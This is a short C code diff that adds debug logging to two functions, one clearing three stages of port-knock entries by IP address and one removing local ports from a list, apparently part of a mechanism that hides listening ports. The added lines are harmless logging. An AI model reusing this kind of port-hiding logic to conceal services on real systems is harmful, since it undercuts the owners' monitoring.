@@ -91,16 +91,22 @@ clear_hidden_lports(void)
     ip_t no_ip = { 0 };
 
     i = ips_stage1_tail;
-    if (memcmp(i->ip, no_ip, (i->version == v4 ? 4 : 16)))
+    if (memcmp(i->ip, no_ip, (i->version == v4 ? 4 : 16))) {
+        DEBUG_INFO("removing from stage1\n");
         while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
+    }
 
     i = ips_stage2_tail;
-    if (memcmp(i->ip, no_ip, (i->version == v4 ? 4 : 16)))
+    if (memcmp(i->ip, no_ip, (i->version == v4 ? 4 : 16))) {
+        DEBUG_INFO("removing from stage2\n");
         while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
+    }
 
     i = ips_stage3_tail;
-    if (memcmp(i->ip, no_ip, (i->version == v4 ? 4 : 16)))
+    if (memcmp(i->ip, no_ip, (i->version == v4 ? 4 : 16))) {
+        DEBUG_INFO("removing from stage3\n");
         while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
+    }
 
     lport_list_t_ptr j;
 
@@ -151,6 +157,7 @@ remove_lport_from_list(lport_list_t_ptr list, lport_t lport)
     lport_list_t_ptr i = find_lport_in_list(list, lport), ret = NULL;
 
     if (i && (i->lport != -1)) {
+        DEBUG_INFO("remove_lport_from_list: removing lport %d\n", lport);
         if (i->next)
             i->next->prev = i->prev;
         else
